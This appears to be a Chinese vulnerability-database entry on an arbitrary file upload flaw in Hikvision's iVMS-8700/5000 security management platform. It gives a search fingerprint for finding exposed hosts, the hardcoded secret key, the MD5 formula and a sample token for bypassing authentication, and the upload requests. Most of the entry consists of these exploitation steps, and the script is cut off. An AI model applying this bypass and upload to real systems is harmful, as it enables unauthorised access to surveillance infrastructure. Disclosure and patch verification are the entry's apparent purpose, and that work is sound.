# 海康威视iVMS-8700综合安防系统resourceOperations任意文件上传漏洞

- **系统**：海康　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`hunter：`web.body="/views/home/file/installPackage.rar"``
- **请求**：`POST /eps/api/resourceOperations/upload HTTP/1.1`

**请求体 / payload**
```
1. 访问`/eps/api/resourceOperations/upload`，发现token需要进行鉴权
Host: xx.xx.xx.xx
Content-Type:multipart/form-data;boundary=----WebKitFormBoundaryGEJwjlojPo
Content-Length: 52
service=http://xx.xx.xx.xx/home/index.action
2. 构造token绕过认证（内部机制：如果token值与请求url+secretkey的md5值相同就可以绕过认证）
secretkey是代码里写死的（默认值：secretKeyIbuilding）\
token值需要进行MD5加密（32位大写）\
组合：token=MD5(url+"secretKeyIbuilding")
http://xx.xx.xx.xx/eps/api/resourceOperations/uploadsecretKeyIbuilding
3. 构造上传文件,上传成功且返回了resourceUuid值
POST /eps/api/resourceOperations/upload?token=DFB0D4034A82263A4DA9A37EB0DA687B HTTP/1.1
Host: xx.xx.xx.xx
Content-Type:…（脚本共 911 字，完整版见原文）
```

**其他**
- 海康威视iVMS-8700综合安防系统resourceOperations任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 海康威视综合安防系统iVMS-5000
* 海康威视综合安防系统 iVMS-8700